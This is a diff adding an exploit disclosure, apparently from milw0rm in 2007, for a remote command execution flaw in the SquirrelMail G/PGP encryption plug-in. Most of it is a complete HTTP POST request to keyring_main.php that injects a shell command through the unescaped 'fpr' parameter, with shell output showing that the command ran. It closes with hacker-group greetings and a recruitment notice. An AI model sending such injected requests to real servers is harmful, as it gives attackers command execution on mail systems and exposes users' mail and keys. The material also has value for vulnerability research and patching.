@@ -1,0 +1,50 @@
+SquirrelMail G/PGP Encryption Plug-in Remote Command Execution Vulnerability
+
+Bugtraq ID: 24782
+
+-----------------------------
+
+There are various vulnerabilities in this software! One is in
+keyring_main.php!
+$fpr is not escaped from shellcommands!
+
+testbox:/home/w00t# cat /tmp/w00t
+cat: /tmp/w00t: No such file or directory
+testbox:/home/w00t#
+
+***@silverlaptop:~$ nc *** 80
+POST /webmail/plugins/gpg/modules/keyring_main.php HTTP/1.1
+Host: ***
+User-Agent: w00t
+Keep-Alive: 300
+Connection: keep-alive
+Cookie: Authentication Data for SquirrelMail
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 140
+
+id=C5B1611B8E71C***&fpr= | touch /tmp/w00t |
+&pos=0&sort=email_name&desc=&srch=&ring=all&passphrase=&deletekey=true&deletepair=false&trust=1
+
+...
+
+testbox:/home/w00t# cat /tmp/w00t
+testbox:/home/w00t#
+
+So we just executed 'touch /tmp/w00t'!
+
+WabiSabiLabi tries to sell the exploit for 700 Euro! ;)
+lol @ WabiSabiLabi!
+
+Greets:
+
+oli and all members of jmp-esp!
+
+
+jmp-esp is looking for people who are interested in IT security!
+Currently we are looking for people who like to write articles for a
+German ezine or are interested in exchanging informations, exploits...
+
+IRC: jmp-esp.kicks-ass.net / 6667 or 6661 (ssl)
+    #main
+
+# milw0rm.com [2007-07-11]
